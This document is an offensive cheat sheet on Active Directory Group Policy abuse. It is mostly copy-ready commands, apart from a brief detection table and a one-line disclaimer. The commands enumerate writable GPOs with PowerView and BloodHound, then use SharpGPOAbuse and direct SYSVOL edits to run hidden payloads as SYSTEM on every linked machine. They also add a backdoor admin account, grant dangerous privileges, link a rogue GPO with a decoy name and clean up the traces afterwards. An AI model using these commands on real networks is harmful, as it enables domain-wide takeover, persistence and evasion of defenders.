---
title: "GPO Abuse — From Windows"
weight: 9
tags: ["ad", "gpo", "group-policy", "windows", "sharphound", "persistence"]
---

## Quick Reference

| Technique | Tool | Requirement | Effect |
|---|---|---|---|
| Immediate Scheduled Task | SharpGPOAbuse | Write on GPO | Code exec as SYSTEM on all linked machines |
| Restricted Groups | SharpGPOAbuse | Write on GPO | Add attacker to local Admins |
| User Rights Assignment | SharpGPOAbuse | Write on GPO | Grant SeDebugPrivilege / SeImpersonatePrivilege |
| Manual XML task | PowerShell / SYSVOL write | Write on GPO or SYSVOL | Arbitrary command as SYSTEM |
| New GPO + Link | PowerView / RSAT | CreateGPO right + link permission | Full control over target OU |
| GPO Delegation read | PowerView / BloodHound | Any domain user | Map attack surface |

---

## GPO Fundamentals

Group Policy Objects (GPOs) are containers of policy settings applied to users and computers. They are linked to Organizational Units (OUs), Sites, or the Domain. When a machine or user logs in, the domain controller delivers applicable GPOs via SYSVOL (a shared folder replicated to all DCs). The machine then applies them every 90 minutes by default (± 30-minute random offset), or immediately on `gpupdate /force`.

**Why GPO abuse matters:**
- A single writable GPO linked to the Domain Controllers OU gives code execution as SYSTEM on every DC.
- A GPO linked to an OU containing all workstations gives mass lateral movement.
- GPO settings persist until removed — useful for persistence.
- GPO modification does not require modifying computer objects directly.

---

## Enumerating GPO Permissions

### PowerView — GPO ACL Enumeration

```powershell
# Load PowerView
Import-Module .\PowerView.ps1

# List all GPOs with display name and GUID
Get-DomainGPO | Select-Object DisplayName, Name, gpcFileSysPath

# Find all GPO ACEs granting write/control rights
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|WriteProperty|WriteDACL|WriteOwner|GenericAll" -and
    $_.SecurityIdentifier -notmatch "S-1-5-18|S-1-5-9|S-1-3-0"
} | Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier

# Resolve SIDs to names in the output above
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDACL" -and
    $_.SecurityIdentifier -notmatch "S-1-5-18|S-1-5-9"
} | ForEach-Object {
    $sid = $_.SecurityIdentifier
    $name = (Convert-SidToName $sid)
    [PSCustomObject]@{
        GPO    = $_.ObjectDN
        Rights = $_.ActiveDirectoryRights
        SID    = $sid
        Name   = $name
    }
}
```

### Find GPOs Where the Current User Has Write Rights

```powershell
# Get current user SID
$currentSID = (Get-DomainUser -Identity $env:USERNAME).objectsid

# GPOs where current user has GenericWrite or GenericAll
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|GenericAll" -and
    $_.SecurityIdentifier -eq $currentSID
} | Select-Object ObjectDN, ActiveDirectoryRights
```

### Enumerate GPO Scope — Which OUs are Affected

```powershell
# Find OUs linked to a specific GPO (by GUID)
Get-DomainOU | Where-Object { $_.gplink -match "GPO_GUID" } |
    Select-Object DistinguishedName, Name, gplink

# Find OUs linked to GPO by display name
$gpo = Get-DomainGPO -Identity "GPO_NAME"
$gpoGuid = $gpo.Name  # GUID is the .Name field (format: {GUID})
Get-DomainOU | Where-Object { $_.gplink -match $gpoGuid } |
    Select-Object DistinguishedName, Name
```

### List Computers Affected by a Specific GPO

```powershell
# Get all computers in OUs linked to a GPO
$gpoGuid = "GPO_GUID"
$affectedOUs = Get-DomainOU | Where-Object { $_.gplink -match $gpoGuid }
$affectedOUs | ForEach-Object {
    Get-DomainComputer -SearchBase $_.DistinguishedName |
        Select-Object Name, DNSHostName, OperatingSystem
}
```

### List GPOs Linked to High-Value OUs

```powershell
# Domain Controllers OU — highest value target
Get-DomainOU "Domain Controllers" | Select-Object gplink

# All OUs and their linked GPOs
Get-DomainOU | Select-Object Name, DistinguishedName, gplink |
    Where-Object { $_.gplink -ne $null }

# List all GPOs with RSAT GroupPolicy module
Get-GPO -All | Select-Object DisplayName, Id, GpoStatus, CreationTime, ModificationTime
```

### BloodHound GPO Paths

```
# In BloodHound Cypher console:
# Find shortest path to DA via GPO
MATCH p=shortestPath((n {name:"USERNAME@TARGET_DOMAIN"})-[*1..]->(m:GPO)) RETURN p

# Find GPOs linked to Domain Controllers OU
MATCH (g:GPO)-[:GpLink]->(o:OU {name:"DOMAIN CONTROLLERS@TARGET_DOMAIN"}) RETURN g.name

# Find all principals with write rights on any GPO
MATCH (n)-[:GenericWrite|GenericAll|WriteDacl|WriteOwner]->(g:GPO) RETURN n.name, g.name
```

---

## SharpGPOAbuse — Immediate Scheduled Task (SYSTEM Execution)

An immediate scheduled task runs once, immediately after GPO applies. It executes as `NT AUTHORITY\SYSTEM` on all computers in the GPO's scope. Default GPO refresh: 90 minutes (± 30 min random). Can be forced with `gpupdate /force`.

**Requirement:** GenericWrite or WriteDACL on the target GPO.

### Add Backdoor Local Admin User

```
SharpGPOAbuse.exe --AddComputerTask \
  --TaskName "WindowsUpdate" \
  --Author "NT AUTHORITY\SYSTEM" \
  --Command "cmd.exe" \
  --Arguments "/c net user BACKDOOR_USER Password123! /add && net localgroup administrators BACKDOOR_USER /add" \
  --GPOName "GPO_NAME"
```

### Execute PowerShell Payload (Base64-encoded)

```
SharpGPOAbuse.exe --AddComputerTask \
  --TaskName "WinTelemetry" \
  --Author "NT AUTHORITY\SYSTEM" \
  --Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
  --Arguments "-NonInteractive -WindowStyle Hidden -enc BASE64_PAYLOAD" \
  --GPOName "GPO_NAME"
```

### Execute Arbitrary Binary

```
SharpGPOAbuse.exe --AddComputerTask \
  --TaskName "SvcHost" \
  --Author "NT AUTHORITY\SYSTEM" \
  --Command "C:\Windows\Temp\beacon.exe" \
  --Arguments "" \
  --GPOName "GPO_NAME"
```

### Force Immediate GPO Refresh

```powershell
# On the target machine (if you have remote access)
Invoke-GPUpdate -Computer DC_HOSTNAME -Force -RandomDelayInMinutes 0

# Locally on the target machine
gpupdate /force /target:computer

# Via nxc (if local admin on target)
# nxc smb TARGET_IP -u USERNAME -p 'PASSWORD' -x "gpupdate /force"
```

---

## SharpGPOAbuse — Add Local Administrator via Restricted Groups

Restricted Groups policy adds specified accounts to local groups on all targeted machines. Survives reboots and persists until the GPO is removed or the policy is changed.

```
# Add attacker account to local Administrators group on all machines in GPO scope
SharpGPOAbuse.exe --AddLocalAdmin \
  --UserAccount "TARGET_DOMAIN\USERNAME" \
  --GPOName "GPO_NAME"
```

```
# Verify the policy was written (check SYSVOL)
# \\TARGET_DOMAIN\SYSVOL\TARGET_DOMAIN\Policies\{GPO_GUID}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
# Should contain [Group Membership] section with USERNAME in Administrators
```

---

## SharpGPOAbuse — User Rights Assignment

Grant specific Windows privileges to an attacker-controlled account on all machines in GPO scope. Useful for privilege escalation post-lateral movement.

```
# Grant SeDebugPrivilege and SeImpersonatePrivilege
SharpGPOAbuse.exe --AddUserRights \
  --UserRights "SeDebugPrivilege,SeImpersonatePrivilege" \
  --UserAccount "TARGET_DOMAIN\USERNAME" \
  --GPOName "GPO_NAME"

# Grant SeBackupPrivilege and SeRestorePrivilege (useful for SAM/NTDS read)
SharpGPOAbuse.exe --AddUserRights \
  --UserRights "SeBackupPrivilege,SeRestorePrivilege" \
  --UserAccount "TARGET_DOMAIN\USERNAME" \
  --GPOName "GPO_NAME"

# Grant SeTakeOwnershipPrivilege
SharpGPOAbuse.exe --AddUserRights \
  --UserRights "SeTakeOwnershipPrivilege" \
  --UserAccount "TARGET_DOMAIN\USERNAME" \
  --GPOName "GPO_NAME"
```

---

## Manual GPO Modification via SYSVOL (PowerShell XML)

If SharpGPOAbuse is unavailable but you have write access to the GPO path on SYSVOL, you can write the scheduled task XML directly. SYSVOL is accessible as `\\TARGET_DOMAIN\SYSVOL\TARGET_DOMAIN\Policies\{GPO_GUID}\`.

### Locate the GPO SYSVOL Path

```powershell
# Get SYSVOL path for the target GPO
$gpo = Get-DomainGPO -Identity "GPO_NAME"
$gpo.gpcFileSysPath
# Returns: \\TARGET_DOMAIN\SYSVOL\TARGET_DOMAIN\Policies\{GPO_GUID}
```

### Write Immediate Scheduled Task XML to SYSVOL

```powershell
$gpoGuid = "GPO_GUID"
$domain   = "TARGET_DOMAIN"
$taskXml = @'
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A0660CC48F2C}">
  <ImmediateTaskV2
    clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}"
    name="SvcUpdate"
    image="0"
    changed="2024-01-01 00:00:00"
    uid="{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}">
    <Properties
      action="C"
      name="SvcUpdate"
      runAs="NT AUTHORITY\System"
      logonType="S4U">
      <Task version="1.3">
        <Principals>
          <Principal id="Author">
            <UserId>NT AUTHORITY\System</UserId>
            <RunLevel>HighestAvailable</RunLevel>
          </Principal>
        </Principals>
        <Settings>
          <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
          <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
          <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
          <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
        </Settings>
        <Actions Context="Author">
          <Exec>
            <Command>cmd.exe</Command>
            <Arguments>/c COMMAND_HERE</Arguments>
          </Exec>
        </Actions>
      </Task>
    </Properties>
  </ImmediateTaskV2>
</ScheduledTasks>
'@

# Write to SYSVOL (requires write access)
$taskDir = "\\$domain\SYSVOL\$domain\Policies\{$gpoGuid}\Machine\Preferences\ScheduledTasks"
New-Item -ItemType Directory -Path $taskDir -Force | Out-Null
$taskXml | Out-File -FilePath "$taskDir\ScheduledTasks.xml" -Encoding utf8
```

### Bump GPO Version Counter (Required)

After modifying a GPO, the version number in `GPT.INI` must be incremented, otherwise clients will not apply the new settings (they compare the cached version against the current value).

```powershell
$gpoGuid = "GPO_GUID"
$domain   = "TARGET_DOMAIN"
$gptPath  = "\\$domain\SYSVOL\$domain\Policies\{$gpoGuid}\GPT.INI"

$content  = Get-Content $gptPath
$version  = [int]($content | Select-String "Version=(\d+)" |
            ForEach-Object { $_.Matches[0].Groups[1].Value })
$newVersion = $version + 1
$content    = $content -replace "Version=\d+", "Version=$newVersion"
$content | Set-Content $gptPath -Encoding Ascii
Write-Output "GPT.INI updated: Version $version -> $newVersion"
```

---

## PowerView — GPO Linkage and Mapping

```powershell
# Map GPO → affected computers (combined query)
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity DC_HOSTNAME
Get-DomainGPOComputerLocalGroupMapping -Domain TARGET_DOMAIN -LocalGroup Administrators

# Map user → GPOs that add them to local admin
Get-DomainGPOUserLocalGroupMapping -Identity USERNAME -LocalGroup Administrators

# Enumerate GPO applied to a specific host
Get-DomainGPO -ComputerIdentity TARGET_HOSTNAME

# Find who can create GPOs (CreateChild right on Group Policy container)
Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=TARGET_DOMAIN,DC=com" `
    -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "CreateChild"
} | Select-Object SecurityIdentifier, ActiveDirectoryRights

# Find who can link GPOs to OUs (write on gpLink attribute)
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.ObjectAceType -match "GP-Link" -and
    $_.ActiveDirectoryRights -match "WriteProperty"
} | Select-Object ObjectDN, SecurityIdentifier
```

---

## Create and Link a New GPO (if CreateGPO rights exist)

```powershell
# Requires: CreateChild right on the Group Policy Objects container
# AND: Write to gpLink attribute on target OU

Import-Module GroupPolicy

# Create new GPO
New-GPO -Name "WindowsUpdate Policy" -Comment "Standard update policy"

# Get the new GPO GUID
$gpo = Get-GPO -Name "WindowsUpdate Policy"
$gpo.Id  # GUID

# Link to a target OU
New-GPLink -Name "WindowsUpdate Policy" \
  -Target "OU=Workstations,DC=TARGET_DOMAIN,DC=com" \
  -LinkEnabled Yes -Enforced Yes

# Now modify the GPO via SharpGPOAbuse or manual SYSVOL write
SharpGPOAbuse.exe --AddComputerTask \
  --TaskName "Update" \
  --Author "NT AUTHORITY\SYSTEM" \
  --Command "cmd.exe" \
  --Arguments "/c COMMAND_HERE" \
  --GPOName "WindowsUpdate Policy"
```

---

## Cleanup — Removing GPO Artifacts

```powershell
# Remove the scheduled task from GPO (if you added it)
# Delete the XML from SYSVOL and decrement version:
$gpoGuid = "GPO_GUID"
$domain   = "TARGET_DOMAIN"
$taskFile = "\\$domain\SYSVOL\$domain\Policies\{$gpoGuid}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
Remove-Item -Path $taskFile -Force

# Decrement version counter in GPT.INI
$gptPath = "\\$domain\SYSVOL\$domain\Policies\{$gpoGuid}\GPT.INI"
$content = Get-Content $gptPath
$version = [int]($content | Select-String "Version=(\d+)" |
           ForEach-Object { $_.Matches[0].Groups[1].Value })
$content = $content -replace "Version=\d+", "Version=$($version - 1)"
$content | Set-Content $gptPath -Encoding Ascii

# If you created a GPO — remove it
Remove-GPO -Name "GPO_NAME" -Domain TARGET_DOMAIN

# If you linked a GPO — remove the link
Remove-GPLink -Name "GPO_NAME" -Target "OU=Workstations,DC=TARGET_DOMAIN,DC=com"

# Remove the backdoor user if you added one
net user BACKDOOR_USER /delete
```

---

## Detection Notes

| Action | Detection Artifact |
|---|---|
| GPO modification | Event ID 5136 (Directory Service Changes) on DC |
| GPT.INI version change | File modification on SYSVOL (Sysmon Event 11) |
| Scheduled task runs | Event ID 4698 (task created), 4702 (modified), 200/201 in Task Scheduler log |
| gpupdate forced remotely | Event ID 4688 + gpupdate.exe in process creation logs |
| New GPO created | Event ID 5137 |
| GPO linked to OU | Event ID 5136 on gpLink attribute |

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
